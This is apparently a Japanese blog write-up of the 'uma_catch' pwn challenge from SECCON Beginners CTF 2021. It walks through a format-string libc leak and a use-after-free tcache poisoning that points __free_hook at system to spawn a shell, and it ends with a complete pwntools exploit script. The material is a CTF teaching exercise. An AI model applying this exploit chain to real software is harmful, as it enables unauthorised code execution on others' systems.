---
title: "uma_catch - SECCON Beginners CTF 2021"
date: 2022-05-04T16:08:40+09:00
tags: ["pwn", "SECCONBeginnersCTF2021"]
draft: false
---

[uma_catch - SECCON BeginnersCTF2021(My solver)](https://github.com/yu1hpa/ctf-writeup/tree/master/2021/SECCONBeginnersCTF/uma_catch)

# 方針
Format Strings Bug によってlibc内のアドレスをリークし、
tcache poisoningでShellを取る。

## FSBによるlibc leak
`src.c`の197行目の`show`関数では、
フォーマット指定子をしていないことによるFSBが起こる。

```c
void show() {
    printf(list[get_index()]->name);
}
```

### __libc_start_main内のアドレスを探す旅
次に、`__libc_start_main`のアドレスを調べる。
以下のように調べることができる。

```
gef➤  disass __libc_start_main
Dump of assembler code for function __libc_start_main:
   0x00007ffff7a03b10 <+0>:     push   r13
   0x00007ffff7a03b12 <+2>:     push   r12
    （中略）
   0x00007ffff7a03bf0 <+224>:   mov    rax,QWORD PTR [rsp+0x18]
   0x00007ffff7a03bf5 <+229>:   call   rax
   0x00007ffff7a03bf7 <+231>:   mov    edi,eax
   0x00007ffff7a03bf9 <+233>:   call   0x7ffff7a25240 <exit>
   0x00007ffff7a03bfe <+238>:   mov    rax,QWORD PTR [rip+0x3ceda3]        # 0x7ffff7dd29a8
    （中略）
   0x00007ffff7a03cc3 <+435>:   call   QWORD PTR [rdx+0x168]
   0x00007ffff7a03cc9 <+441>:   jmp    0x7ffff7a03ba5 <__libc_start_main+149>
End of assembler dump.
```

以下のように、`%p`をたくさん送ると、スタック上のアドレスがリークされる。
`__libc_start_main`のアドレスの範囲でリークしているものがないか探す。

```
-*-*-*-*-
UMA catch
-*-*-*-*-

Commands
1. catch hourse
2. naming hourse
3. show hourse
4. dance
5. release hourse
6. exit

command?
> 1
index?
> 0
color?(bay|chestnut|gray)
> bay

command?
> 2
index?
> 0
name?
> %p%p%p%p%p%p%p%p%p%p%p

command?
> 3
index?
> 0
0xffffffda(nil)(nil)0x7fffffffe511(nil)0x7fffffffe5700x5555555553cf0x7fffffffe6500x3000000000x5555555557f00x7ffff7a03bf7
```

最後にリークされているアドレスが、`0x7ffff7a03b10`(<+0>)から`0x00007ffff7a03cc9`(<+441>)の範囲内なので、
libc内のアドレスであることがわかる。

`%p`を11個並べてリークされるアドレスと、`%11$p`でリークされるアドレスは同じである。

### libc base address を求める
リークされたlibcのアドレスは、`0x00007ffff7a03bf7 <+231>`である。
したがって、次の式で求められる。

```
leaked_libc_address - 231 - libc.sym['__libc_start_main']
```

具体的なコードは以下のようになっています。
```python
# libc leak by FSB
catch("0", "bay")
naming("0", "%11$p")
show("0")

libc.address = int(io.recvline().strip(), 16) - 231 - libc.sym['__libc_start_main']
print(f'addr_libc: {libc.address:x}')
```
gdbの`vmmap`で調べた値と、leakされた`libc address`が等しいことが確認できます。
（違う場合は、`ASLR`が無効になっていることを確認してみてください）

## tcache poisoning
[Beginner's Heap（2022-05-01）](https://blog.y2a.dev/articles/2022/05-01/beginners-heap-seccon4b2020/)
では、Heap Overflowからtcache poisoningをやったのですが、今回はUse After Free(UAF)によって、`fd` ポインタを書き換えます。

Use After Freeは、[ptr-yudai](https://twitter.com/ptrYudai)先生作問のuaf4b - CakeCTF2021がわかりやすいです。
私も解いて、[uaf4b（2022-05-02）](https://blog.y2a.dev/articles/2022/05-02/uaf4b/)で詳しく説明しているので、ぜひ確認してみてください。

### hourse構造体
hourse構造体は次のように構成されています。
```c
struct hourse {
    char name[0x20];
    void (*dance)();
};
```

### UAFによって`fd`を`__free_hook`で上書き
libc addressをリークしたあと、確保していた領域をfreeします。
freeした後、`name[0x20]`に`__free_hook`のアドレスを書き込むと、`fd`が上書きされます。

freeした時点のtcacheの様子は、次のようになっています。
```
tcache[0x30]: bay -> NULL
```

`fd`を`__free_hook`で上書きしたあとの様子。
```
tcache: bay -> __free_hook -> NULL
```

具体的なコードは以下のようになっています。
```python
release("0") # tcache: bay -> NULL
naming("0", p64(libc.sym['__free_hook']))
#=> tcache: bay -> __free_hook -> NULL
```

### `/bin/sh`を書き込む領域を確保
`chestnut`という名前の領域を新たに確保します。

malloc君は、tcache君が同じサイズをキャッシュしていたら、
その領域を返すので、この領域のアドレスは`bay`と同じである。

よって、tcacheに繋がっているのは、`__free_hook`だけである。
```
tcache[0x30]: __free_hook -> NULL
```

### `__free_hook`を`system`に向けて`system("/bin/sh")`
`gray`という名前の領域を新たに確保すると、
返ってくるのは`__free_hook`のアドレスである。

そこに、`system`のアドレスを書き込むと、`__free_hook`は`system`を向くようになる。
```
__free_hook -> system
```

具体的なコードは以下のようになっています。
```python
catch("2", "gray") # gray == __free_hook
naming("2", p64(libc.sym['system'])) #__free_hook -> system
```

あとは、`/bin/sh`が書き込まれている領域`chestnut`(list[1])をfreeすると、
`__free_hook(list[1])` -> `system("/bin/sh")`となって、Shellを取ることができる。

# Solver
```python
from pwn import *

file = "./chall"
libc = ELF("./libc-2.27.so")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def catch(index: str, color: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "1")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)
    io.recvuntil("color?(bay|chestnut|gray)")
    io.sendlineafter("> ", color)

def naming(index: str, name: bytes):
    io.recvuntil("command?")
    io.sendlineafter("> ", "2")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)
    io.recvuntil("name?")
    io.sendlineafter("> ", name)

def show(index: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "3")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)

def release(index: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "5")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)

# libc leak by FSB
catch("0", "bay")
naming("0", "%11$p")
show("0")

libc.address = int(io.recvline().strip(), 16) - 231 - libc.sym['__libc_start_main']
print(f'addr_libc: {libc.address:x}')


release("0") # tcache: bay -> NULL
# fd = __free_hook
naming("0", p64(libc.sym['__free_hook']))
#=> tcache: bay -> __free_hook -> NULL

# chestnut(addr) == bay(addr)
catch("1", "chestnut") # tcache: __free_hook -> NULL
naming("1", b"/bin/sh") # list[1]->name = "/bin/sh"

catch("2", "gray") # gray == __free_hook
naming("2", p64(libc.sym['system'])) #__free_hook -> system

release("1") # __free_hook(list[1]) == system("/bin/sh")

io.interactive()
```
